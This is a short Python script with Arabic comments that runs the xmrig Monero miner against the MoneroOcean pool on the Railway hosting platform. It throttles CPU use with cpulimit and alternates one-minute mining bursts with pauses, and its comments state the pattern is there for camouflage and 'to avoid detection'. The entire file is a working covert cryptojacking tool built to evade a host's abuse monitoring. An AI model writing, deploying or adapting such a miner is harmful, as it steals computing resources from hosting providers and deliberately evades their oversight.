import subprocess
import time
import os
import sys

# جلب المحفظة من متغيرات البيئة في Railway
WALLET = os.getenv("WALLET_ADDRESS")
# المجمع الجديد الذي اخترتِه
POOL = "gulf.moneroocean.stream:10128"

if not WALLET:
    print("خطأ: يجب تحديد WALLET_ADDRESS في إعدادات Railway!")
    sys.exit(1)

def run_mining():
    while True:
        print("Starting mining pulse with MoneroOcean...")
        
        # أمر التشغيل المدمج مع cpulimit بنسبة 5%
        # استخدمنا التوصية التقنية (cpu-max-threads-hint=1) لتقليل العبء
        cmd = [
            "cpulimit", "-l", "5", "--", 
            "./xmrig", 
            "-o", POOL, 
            "-u", WALLET, 
            "-p", "x", 
            "--cpu-max-threads-hint", "1"
        ]
        
        process = subprocess.Popen(cmd)
        
        # العمل لمدة دقيقة ثم استراحة للتمويه
        time.sleep(60)
        
        # إنهاء العملية بذكاء
        process.terminate()
        process.wait() 
        
        print("Sleeping to avoid detection...")
        time.sleep(30)

if __name__ == "__main__":
    run_mining()
    
